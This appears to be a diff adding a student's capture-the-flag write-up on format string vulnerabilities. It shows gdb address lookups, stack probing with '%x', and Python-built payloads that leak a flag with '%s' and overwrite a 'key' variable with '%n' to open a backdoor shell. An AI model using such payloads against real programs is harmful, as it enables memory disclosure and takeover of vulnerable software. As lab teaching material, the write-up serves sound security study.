@@ -103,3 +103,67 @@ content[12:12+len(fmt)] = fmt
 ```
 
 Note that instead of writing a huge number to the address in memory, we simply write two smaller ones and divide them across the address.
+
+# Week 7 CTF
+
+## Challenge 1
+
+For this challenge, the source code of a program was available.
+There, we noticed a flag was being stored as a global variable.
+Furthermore, we encountered a vulnerability in the program:
+
+```c
+printf(buffer)
+```
+
+This meant that we could supply a malicious format string to get to the flag.
+First, the `gdb` was used to find out the address of the flag:
+
+```bash
+gdb-peda$ info address flag
+Symbol "flag" is static storage at address 0x804c060.
+```
+
+Then, we needed to find out where our input was being stored in the stack. Therefore, we used the following string to display the contents of the stack:
+
+```python
+s = "????" + "%.8x\n"*63
+```
+
+Because the ouput was `????3f3f3f3f` and `3f` is `"?"` in hex, we knew that the buffer was in the first position of the stack.
+With all this information, it was easy to extract the flag:
+
+```python
+c = (0x0804c060).to_bytes(4, byteorder='little') 
+s = "%s"
+fmt = (s).encode('latin-1')
+c += fmt
+```
+
+## Challenge 2
+
+This time, the flag was not being loaded into memory.
+Instead, a global variable `key` was being used to verify access to a 'backdoor'.
+If it was equal to `0xbeef`, a bash program would be loaded.
+Therefore, we had to modify the key variable in order to gain access to the flag.
+
+This can be done with a similar process to the one in the first task.
+The variable address was discovered in the same fashion:
+
+```bash
+gdb-peda$ info address key
+Symbol "key" is static storage at address 0x804c034.
+```
+
+Then, we verified that the buffer was located in the same place in the stack.
+After that, we needed to use `%n` to overwrite the value in memory.
+The value of bytes to be written would be equal to `0xbeef - 8`.
+
+```python
+c = (0xaaaabbbb).to_bytes(4, byteorder='little') #placeholder
+c += (0x0804c034).to_bytes(4, byteorder='little') 
+s = "%.48871x" + "%n"
+
+fmt = (s).encode('latin-1')
+c += fmt
+```
